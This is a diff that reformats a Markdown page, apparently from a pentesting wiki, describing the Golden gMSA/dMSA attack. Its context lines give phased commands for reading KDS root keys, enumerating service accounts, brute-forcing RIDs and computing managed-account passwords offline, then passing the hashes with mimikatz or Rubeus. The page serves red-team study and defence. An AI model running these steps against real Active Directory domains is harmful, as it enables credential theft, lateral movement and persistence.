@@ -1,6 +1,5 @@
 # Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)
 
-
 ## Overview
 
 Windows Managed Service Accounts (MSA) are special principals designed to run services without the need to manually manage their passwords.
@@ -53,7 +52,7 @@ GoldendMSA.exe kds
 # With GoldenGMSA
 GoldenGMSA.exe kdsinfo
 ```
-```The base64 string labelled `RootKey` (GUID name) is required in later steps.
+The base64 string labelled `RootKey` (GUID name) is required in later steps.
 
 ##### Phase 2 – Enumerate gMSA / dMSA objects
 
@@ -66,7 +65,7 @@ Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
   
 GoldenGMSA.exe gmsainfo
 ```
-```
+
 [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implements helper modes:
 
 ```bash
@@ -76,7 +75,7 @@ GoldendMSA.exe info -d example.local -m ldap
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-```
+
 ##### Phase 3 – Guess / Discover the ManagedPasswordID (when missing)
 
 Some deployments *strip* `msDS-ManagedPasswordId` from ACL-protected reads.
@@ -90,7 +89,7 @@ Therefore a **narrow wordlist per account** (± few hours) is realistic.
 ```bash
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
-```The tool computes candidate passwords and compares their base64 blob against the real `msDS-ManagedPassword` attribute – the match reveals the correct GUID.
+The tool computes candidate passwords and compares their base64 blob against the real `msDS-ManagedPassword` attribute – the match reveals the correct GUID.
 
 ##### Phase 4 – Offline Password Computation & Conversion
 
@@ -101,7 +100,7 @@ Once the ManagedPasswordID is known, the valid password is one command away:
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-```The resulting hashes can be injected with **mimikatz** (`sekurlsa::pth`) or **Rubeus** for Kerberos abuse, enabling stealth **lateral movement** and **persistence**.
+The resulting hashes can be injected with **mimikatz** (`sekurlsa::pth`) or **Rubeus** for Kerberos abuse, enabling stealth **lateral movement** and **persistence**.
 
 ## Detection & Mitigation
 
@@ -120,8 +119,8 @@ GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswor
 
 ## References
 
-- [[https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/|Golden dMSA – authentication bypass for delegated Managed Service Accounts]]
-- [[https://www.semperis.com/blog/golden-gmsa-attack/|gMSA Active Directory Attacks Accounts]]
-- [[https://github.com/Semperis/GoldenDMSA|Semperis/GoldenDMSA GitHub repository]]
-- [[https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent|Improsec – Golden gMSA trust attack]]
+- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
+- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
 
